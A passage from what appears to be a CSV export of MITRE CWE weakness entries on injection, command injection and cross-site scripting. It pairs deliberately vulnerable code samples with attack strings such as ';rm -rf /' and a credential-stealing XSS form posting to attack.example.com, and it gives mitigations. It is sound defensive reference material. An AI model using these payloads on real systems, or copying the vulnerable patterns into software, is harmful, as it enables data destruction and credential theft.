DesignWhen the set of filenames is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames, and reject all other inputs. For example, ID 1 could map to ""inbox.txt"" and ID 2 could map to ""profile.txt"". Features such as the ESAPI AccessReferenceMap provide this capability.Phases:  Architecture and Design; OperationRun your code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict all access to files within a particular directory.Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single ""."" character in the filename to avoid weaknesses such asCWE-23, and exclude directory separators such as ""/"" to avoidCWE-36. Use a list of allowable file extensions, which will help to avoidCWE-434.Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering ""/"" is insufficient protection if the filesystem also supports the use of ""\"" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ""../"" sequences are removed from the "".../...//"" string in a sequential fashion, two instances of ""../"" would be removed from the original string, but the remaining characters would still form the ""../"" string.Effectiveness: HighPhase:  ImplementationUse a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes "".."" sequences and symbolic links (CWE-23,CWE-59).Phases:  Installation; OperationUse OS-level permissions and run as a low-privileged user to limit the scope of any successful attack.Phases:  Operation; ImplementationIf you are using PHP, configure your application so that it does not use register_globals. During implementation, develop your application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such asCWE-95,CWE-621, and similar issues.Phase:  TestingUse tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."
CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'),"The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component.","Scope: Confidentiality, Impact: Technical Impact:Read Application DataMany injection attacks involve the disclosure of important information -- in terms of both data sensitivity and usefulness in further exploitation., Likelihood: ; Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismIn some cases, injectable code controls authentication; this may lead to a remote vulnerability., Likelihood: ; Scope: Other, Impact: Technical Impact:Alter Execution LogicInjection attacks are characterized by the ability to significantly change the flow of a given process, and in some cases, to the execution of arbitrary code., Likelihood: ; Scope: IntegrityOther, Impact: Technical Impact:OtherData injection attacks lead to loss of data integrity in nearly all cases as the control-plane data injected is always incidental to data recall or writing., Likelihood: ; Scope: Non-Repudiation, Impact: Technical Impact:Hide ActivitiesOften the actions performed by injected control code are unlogged., Likelihood: ","Example 1This example code intends to take the name of a user and list the contents of that user's home directory. It is subject to the first variant of OS command injection.(bad code)Example Language:PHP$userName = $_POST[""user""];$command = 'ls -l /home/' . $userName;system($command);The $userName variable is not checked for malicious input. An attacker could set the $userName variable to an arbitrary OS command such as:(attack code);rm -rf /Which would result in $command being:(result)ls -l /home/;rm -rf /Since the semi-colon is a command separator in Unix, the OS would first execute the ls command, then the rm command, deleting the entire file system.Also note that this example code is vulnerable to Path Traversal (CWE-22) and Untrusted Search Path (CWE-426) attacks.Example 2Consider the following program. It intends to perform an ""ls -l"" on an input filename. The validate_name() subroutine performs validation on the input to make sure that only alphanumeric and ""-"" characters are allowed, which avoids path traversal (CWE-22) and OS command injection (CWE-78) weaknesses. Only filenames like ""abc"" or ""d-e-f"" are intended to be allowed.(bad code)Example Language:Perlmy $arg = GetArgument(""filename"");do_listing($arg);sub do_listing {my($fname) = @_;if (! validate_name($fname)) {print ""Error: name is not well-formed!\n"";return;}# build commandmy $cmd = ""/bin/ls -l $fname"";system($cmd);}sub validate_name {my($name) = @_;if ($name =~ /^[\w\-]+$/) {return(1);}else {return(0);}}However, validate_name() alows filenames that begin with a ""-"". An adversary could supply a filename like ""-aR"", producing the ""ls -l -aR"" command (CWE-88), thereby getting a full recursive listing of the entire directory and all of its sub-directories.There are a couple possible mitigations for this
			   weakness. One would be to refactor the code to avoid
			   using system() altogether, instead relying on internal
			   functions.Another option could be to add a ""--"" argument
			   to the ls command, such as ""ls -l --"", so that any
			   remaining arguments are treated as filenames, causing
			   any leading ""-"" to be treated as part of a filename
			   instead of another option.Another fix might be to change the regular expression used in validate_name to force the first character of the filename to be a letter or number, such as:(good code)Example Language:Perlif ($name =~ /^\w[\w\-]+$/) ...",Phase:  RequirementsProgramming languages and supporting technologies might be chosen which are not subject to these issues.Phase:  ImplementationUtilize an appropriate mix of allowlist and denylist parsing to filter control-plane syntax from all input.
CWE-75: Failure to Sanitize Special Elements into a Different Plane (Special Element Injection),The product does not adequately filter user-controlled input for special elements with control implications.,"Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Modify Application Data; Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,Phase:  RequirementsProgramming languages and supporting technologies might be chosen which are not subject to these issues.Phase:  ImplementationUtilize an appropriate mix of allowlist and denylist parsing to filter special element syntax from all input.
CWE-76: Improper Neutralization of Equivalent Special Elements,"The product correctly neutralizes certain special elements, but it improperly neutralizes equivalent special elements.","Scope: Other, Impact: Technical Impact:Other, Likelihood: ",无示范例子,Phase:  RequirementsProgramming languages and supporting technologies might be chosen which are not subject to these issues.Phase:  ImplementationUtilize an appropriate mix of allowlist and denylist parsing to filter equivalent special element syntax from all input.
CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection'),"The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsIf a malicious user injects a character (such as a semi-colon) that delimits the end of one command and the beginning of another, it may be possible to then insert an entirely new and unrelated command that was not intended to be executed., Likelihood: ","Example 1The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.(bad code)Example Language:Cint main(int argc, char** argv) {char cmd[CMD_MAX] = ""/usr/bin/cat "";strcat(cmd, argv[1]);system(cmd);}Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form "";rm -rf /"", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).Example 2The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.(bad code)Example Language:Java...String btype = request.getParameter(""backuptype"");String cmd = new String(""cmd.exe /K \""c:\\util\\rmanDB.bat ""+btype+""&&c:\\utl\\cleanup.bat\"""")System.Runtime.getRuntime().exec(cmd);...The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form ""& del c:\\dbms\\*.*"", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.Example 3The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.(bad code)Example Language:Java...String home = System.getProperty(""APPHOME"");String cmd = home + INITCMD;java.lang.Runtime.getRuntime().exec(cmd);...The code above allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.Example 4The following code is a wrapper around the UNIX command cat which prints the contents of a file to standard out. It is also injectable:(bad code)Example Language:C#include <stdio.h>#include <unistd.h>int main(int argc, char **argv) {char cat[] = ""cat "";char *command;size_t commandLength;commandLength = strlen(cat) + strlen(argv[1]) + 1;command = (char *) malloc(commandLength);strncpy(command, cat, commandLength);strncat(command, argv[1], (commandLength - strlen(cat)) );system(command);return (0);}Used normally, the output is simply the contents of the file requested:(informative)$ ./catWrapper Story.txtWhen last we left our heroes...However, if we add a semicolon and another command to the end of this line, the command is executed by catWrapper with no complaint:(attack code)$ ./catWrapper Story.txt; lsWhen last we left our heroes...Story.txtSensitiveFile.txtPrivateData.dba.out*If catWrapper had been set to have a higher privilege level than the standard user, arbitrary commands could be executed with that higher privilege.","Phase:  Architecture and DesignIf at all possible, use library calls rather than external processes to recreate the desired functionality.Phase:  ImplementationIf possible, ensure that all external commands called from the program are statically created.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  OperationRun time: Run time policy enforcement may be used in an allowlist fashion to prevent use of any non-sanctioned commands.Phase:  System ConfigurationAssign permissions that prevent the user from accessing/opening privileged files."
CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'),"The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.","Scope: ConfidentialityIntegrityAvailabilityNon-Repudiation, Impact: Technical Impact:Execute Unauthorized Code or Commands; DoS: Crash, Exit, or Restart; Read Files or Directories; Modify Files or Directories; Read Application Data; Modify Application Data; Hide ActivitiesAttackers could execute unauthorized commands, which could then be used to disable the product, or read and modify data for which the attacker does not have permissions to access directly. Since the targeted application is directly executing the commands instead of the attacker, any malicious activities may appear to come from the application or the application's owner., Likelihood: ","Example 1This example code intends to take the name of a user and list the contents of that user's home directory. It is subject to the first variant of OS command injection.(bad code)Example Language:PHP$userName = $_POST[""user""];$command = 'ls -l /home/' . $userName;system($command);The $userName variable is not checked for malicious input. An attacker could set the $userName variable to an arbitrary OS command such as:(attack code);rm -rf /Which would result in $command being:(result)ls -l /home/;rm -rf /Since the semi-colon is a command separator in Unix, the OS would first execute the ls command, then the rm command, deleting the entire file system.Also note that this example code is vulnerable to Path Traversal (CWE-22) and Untrusted Search Path (CWE-426) attacks.Example 2The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.(bad code)Example Language:Cint main(int argc, char** argv) {char cmd[CMD_MAX] = ""/usr/bin/cat "";strcat(cmd, argv[1]);system(cmd);}Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form "";rm -rf /"", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120).Example 3This example is a web application that intends to perform a DNS lookup of a user-supplied domain name. It is subject to the first variant of OS command injection.(bad code)Example Language:Perluse CGI qw(:standard);$name = param('name');$nslookup = ""/path/to/nslookup"";print header;if (open($fh, ""$nslookup $name|"")) {while (<$fh>) {print escapeHTML($_);print ""<br>\n"";}close($fh);}Suppose an attacker provides a domain name like this:(attack code)cwe.mitre.org%20%3B%20/bin/ls%20-lThe ""%3B"" sequence decodes to the "";"" character, and the %20 decodes to a space. The open() statement would then process a string like this:(result)/path/to/nslookup cwe.mitre.org ; /bin/ls -lAs a result, the attacker executes the ""/bin/ls -l"" command and gets a list of all the files in the program's working directory. The input could be replaced with much more dangerous commands, such as installing a malicious program on the server.Example 4The example below reads the name of a shell script to execute from the system properties. It is subject to the second variant of OS command injection.(bad code)Example Language:JavaString script = System.getProperty(""SCRIPTNAME"");if (script != null)System.exec(script);If an attacker has control over this property, then they could modify the property to point to a dangerous program.Example 5In the example below, a method is used to transform geographic coordinates from latitude and longitude format to UTM format. The method gets the input coordinates from a user through a HTTP request and executes a program local to the application server that performs the transformation. The method passes the latitude and longitude coordinates as a command-line option to the external program and will perform some processing to retrieve the results of the transformation and return the resulting UTM coordinates.(bad code)Example Language:Javapublic String coordinateTransformLatLonToUTM(String coordinates){String utmCoords = null;try {String latlonCoords = coordinates;Runtime rt = Runtime.getRuntime();Process exec = rt.exec(""cmd.exe /C latlon2utm.exe -"" + latlonCoords);// process results of coordinate transform// ...}catch(Exception e) {...}return utmCoords;}However, the method does not verify that the contents of the coordinates input parameter includes only correctly-formatted latitude and longitude coordinates. If the input coordinates were not validated prior to the call to this method, a malicious user could execute another program local to the application server by appending '&' followed by the command for another program to the end of the coordinate string. The '&' instructs the Windows operating system to execute another program.Example 6The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.(bad code)Example Language:Java...String btype = request.getParameter(""backuptype"");String cmd = new String(""cmd.exe /K \""c:\\util\\rmanDB.bat ""+btype+""&&c:\\utl\\cleanup.bat\"""")System.Runtime.getRuntime().exec(cmd);...The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form ""& del c:\\dbms\\*.*"", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.","Phase:  Architecture and DesignIf at all possible, use library calls rather than external processes to recreate the desired functionality.Phases:  Architecture and Design; OperationStrategy:  Sandbox or JailRun the code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Effectiveness: LimitedNote:The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.Phase:  Architecture and DesignStrategy:  Attack Surface ReductionFor any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. For example, in web applications, this may require storing the data locally in the session's state instead of sending it out to the client in a hidden form field.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phase:  Architecture and DesignStrategy:  Libraries or FrameworksUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationIf the program to be executed allows arguments to be specified within an input file or from standard input, then consider using that mode to pass arguments instead of the command line.Phase:  Architecture and DesignStrategy:  ParameterizationIf available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.Some languages offer multiple functions that can be used to invoke commands. Where possible, identify any function that invokes a command shell using a single string, and replace it with a function that requires individual arguments. These functions typically perform appropriate quoting and filtering of arguments. For example, in C, the system() function accepts a string that contains the entire command to be executed, whereas execl(), execve(), and others require an array of strings, one for each argument. In Windows, CreateProcess() only accepts one command at a time. In Perl, if system() is provided with an array of arguments, then it will quote each of the arguments.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.When constructing OS command strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping.Note that proper output encoding, escaping, and quoting is the most effective solution for preventing OS command injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent OS command injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, when invoking a mail program, you might need to allow the subject field to contain otherwise-dangerous inputs like "";"" and "">"" characters, which would need to be escaped or otherwise handled. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended. This might seem to be a minor inconvenience, but it could be more important when the program relies on well-structured subject lines in order to pass messages to other components.Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.Phase:  Architecture and DesignStrategy:  Enforcement by ConversionWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.Phase:  OperationStrategy:  Compilation or Build HardeningRun the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's ""-T"" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (seeCWE-183andCWE-184).Phase:  OperationStrategy:  Environment HardeningRun the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's ""-T"" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (seeCWE-183andCWE-184).Phase:  ImplementationEnsure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success.If errors must be captured in some detail, record them in log messages, but consider what could occur if the log messages can be viewed by attackers. Highly sensitive information such as passwords should never be saved to log files.Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a user account exists or not.In the context of OS Command Injection, error information passed back to the user might reveal whether an OS command is being executed and possibly which command is being used.Phase:  OperationStrategy:  Sandbox or JailUse runtime policy enforcement to create an allowlist of allowable commands, then prevent use of any command that does not appear in the allowlist. Technologies such as AppArmor are available to do this.Phase:  OperationStrategy:  FirewallUse an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.Effectiveness: ModerateNote:An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Phases:  Operation; ImplementationStrategy:  Environment HardeningWhen using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such asCWE-95,CWE-621, and similar issues."
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'),The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.,"Scope: Access ControlConfidentiality, Impact: Technical Impact:Bypass Protection Mechanism; Read Application DataThe most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsIn some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws., Likelihood: ; Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Execute Unauthorized Code or Commands; Bypass Protection Mechanism; Read Application DataThe consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running ""Active X"" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content., Likelihood: ","Example 1The following code displays a welcome message on a web page based on the HTTP GET username parameter (covers a Reflected XSS (Type 1) scenario).(bad code)Example Language:PHP$username = $_GET['username'];echo '<div class=""header""> Welcome, ' . $username . '</div>';Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as(attack code)http://trustedSite.example.com/welcome.php?username=<Script Language=""Javascript"">alert(""You've been attacked!"");</Script>This results in a harmless alert dialog popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:(attack code)http://trustedSite.example.com/welcome.php?username=<div id=""stealPassword"">Please Login:<form name=""input"" action=""http://attack.example.com/stealPassword.php"" method=""post"">Username: <input type=""text"" name=""username"" /><br/>Password: <input type=""password"" name=""password"" /><br/><input type=""submit"" value=""Login"" /></form></div>If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:(result)<div class=""header""> Welcome, <div id=""stealPassword""> Please Login:<form name=""input"" action=""attack.example.com/stealPassword.php"" method=""post"">Username: <input type=""text"" name=""username"" /><br/>Password: <input type=""password"" name=""password"" /><br/><input type=""submit"" value=""Login"" /></form></div></div>The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):(attack code)trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A+%3Cinput+type%3D%22password%22+name%3D%22password%22+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0AThe same attack string could also be obfuscated as:(attack code)trustedSite.example.com/welcome.php?username=<script+type=""text/javascript"">document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');</script>Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs.Example 2The following code displays a Reflected XSS (Type 1) scenario.The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.(bad code)Example Language:JSP<% String eid = request.getParameter(""eid""); %>...Employee ID: <%= eid %>The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.(bad code)Example Language:ASP.NET<%protected System.Web.UI.WebControls.TextBox Login;protected System.Web.UI.WebControls.Label EmployeeID;...EmployeeID.Text = Login.Text;%><p><asp:label id=""EmployeeID"" runat=""server"" /></p>The code in this example operates correctly if the Employee ID variable contains only standard alphanumeric text. If it has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.Example 3The following code displays a Stored XSS (Type 2) scenario.The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.(bad code)Example Language:JSP<%Statement stmt = conn.createStatement();ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid);if (rs != null) {rs.next();String name = rs.getString(""name"");}%>Employee Name: <%= name %>The following ASP.NET code segment queries a database for an employee with a given employee ID and prints the name corresponding with the ID.(bad code)Example Language:ASP.NET<%protected System.Web.UI.WebControls.Label EmployeeName;...string query = ""select * from emp where id="" + eid;sda = new SqlDataAdapter(query, conn);sda.Fill(dt);string name = dt.Rows[0][""Name""];...EmployeeName.Text = name;%><p><asp:label id=""EmployeeName"" runat=""server"" /></p>This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser.Example 4The following code consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.CreateUser.php(bad code)Example Language:PHP$username = mysql_real_escape_string($username);$fullName = mysql_real_escape_string($fullName);$query = sprintf('Insert Into users (username,password) Values (""%s"",""%s"",""%s"")', $username, 